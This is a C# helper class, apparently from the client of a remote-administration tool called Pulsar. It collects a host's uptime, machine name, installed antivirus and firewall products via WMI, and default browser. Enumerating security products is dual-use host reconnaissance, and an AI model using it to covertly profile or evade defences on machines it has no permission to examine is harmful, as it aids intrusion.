using Microsoft.Win32;
using Pulsar.Common.Helpers;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Management;

namespace Pulsar.Client.Helper
{
    public static class SystemHelper
    {
        public static string GetUptime()
        {
            try
            {
                var proc = System.Diagnostics.Process.GetProcessesByName("winlogon").FirstOrDefault();
                DateTime sessionStart;

                if (proc != null)
                    sessionStart = proc.StartTime;
                else
                    // Fallback to system uptime
                    sessionStart = DateTime.Now - TimeSpan.FromMilliseconds(Environment.TickCount);

                TimeSpan uptimeSpan = DateTime.Now - sessionStart;

                return $"{uptimeSpan.Days}d : {uptimeSpan.Hours}h : {uptimeSpan.Minutes}m : {uptimeSpan.Seconds}s";
            }
            catch
            {
                // Fallback again if access denied or process info unavailable
                TimeSpan uptimeSpan = TimeSpan.FromMilliseconds(Environment.TickCount);
                return $"{uptimeSpan.Days}d : {uptimeSpan.Hours}h : {uptimeSpan.Minutes}m : {uptimeSpan.Seconds}s";
            }
        }
        public static string GetPcName()
        {
            return Environment.MachineName;
        }

        public static string GetAntivirus()
        {
            try
            {
                string antivirusName = string.Empty;
                // starting with Windows Vista we must use the root\SecurityCenter2 namespace
                string scope = "root\\SecurityCenter2";
                string query = "SELECT * FROM AntivirusProduct";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        antivirusName += mObject["displayName"].ToString() + "; ";
                    }
                }
                antivirusName = StringHelper.RemoveLastChars(antivirusName);

                return (!string.IsNullOrEmpty(antivirusName)) ? antivirusName : "N/A";
            }
            catch
            {
                return "Unknown";
            }
        }

        public static string GetFirewall()
        {
            try
            {
                string firewallName = string.Empty;
                // starting with Windows Vista we must use the root\SecurityCenter2 namespace
                string scope = "root\\SecurityCenter2";
                string query = "SELECT * FROM FirewallProduct";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        firewallName += mObject["displayName"].ToString() + "; ";
                    }
                }
                firewallName = StringHelper.RemoveLastChars(firewallName);

                return (!string.IsNullOrEmpty(firewallName)) ? firewallName : "N/A";
            }
            catch
            {
                return "Unknown";
            }
        }

        public static string GetDefaultBrowser()
        {
            try
            {
                const string registryKey = @"Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice";
                using (var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(registryKey))
                {
                    string progId = key?.GetValue("ProgId")?.ToString() ?? "";

                    if (!string.IsNullOrEmpty(progId))
                    {
                        var map = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
                    {
                        { "ChromeHTML", "Google Chrome" },
                        { "MSEdgeHTM", "Microsoft Edge" },
                        { "IE.HTTP", "Internet Explorer" },
                        { "FirefoxURL", "Mozilla Firefox" },
                        { "BraveHTML", "Brave" },
                        { "OperaStable", "Opera" },
                        { "VivaldiHTM", "Vivaldi" }
                    };

                        foreach (var kvp in map)
                        {
                            if (progId.StartsWith(kvp.Key, StringComparison.OrdinalIgnoreCase))
                                return kvp.Value;
                        }

                        // fallback: trim weird suffixes
                        return progId.Split('-')[0].Replace("URL", "").Replace("HTML", "").Trim();
                    }
                }
            }
            catch
            {
                // ignore and fallback
            }

            return "-";
        }
    }
}
